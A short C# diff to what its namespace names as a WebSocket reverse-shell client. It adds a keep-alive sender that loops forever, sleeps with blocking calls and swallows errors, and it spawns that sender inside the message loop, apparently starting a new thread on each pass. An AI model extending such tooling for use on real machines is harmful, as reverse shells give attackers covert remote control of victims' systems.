@@ -38,7 +38,10 @@ namespace WebSocketReverseShellDotNet.service.impl
                         // Continue processing as long as the WebSocket connection is open
                         while (isSocketOpen(webSocket))
                         {
-                            
+                            OSUtil.RunInSeparateThread(() => SendDataEvery50Seconds(webSocket));
+
+                            /*Task.Run(() => SendDataEvery50Seconds(webSocket));*/
+                            /*SendDataEvery50Seconds(webSocket);*/
                             await OnWebSocketMessage(buffer, webSocket);
                         }
                     }
@@ -72,6 +75,22 @@ namespace WebSocketReverseShellDotNet.service.impl
         {
             byte[] buffer = System.Text.Encoding.UTF8.GetBytes(message);
             await webSocket.SendAsync(new ArraySegment<byte>(buffer), WebSocketMessageType.Text, true, CancellationToken.None);
+        }
+
+        static async Task SendDataEvery50Seconds(ClientWebSocket webSocket)
+        {
+            try 
+            {
+                while (true)
+                {
+                    await SendData(webSocket, "KEEP_ALIVE");
+
+                    Thread.Sleep(50000);
+                }
+                
+            }catch (Exception ex) { 
+                /*Console.WriteLine(ex.ToString());*/
+            }
         }
 
         static async Task SendIntialMessageData(ClientWebSocket webSocket)
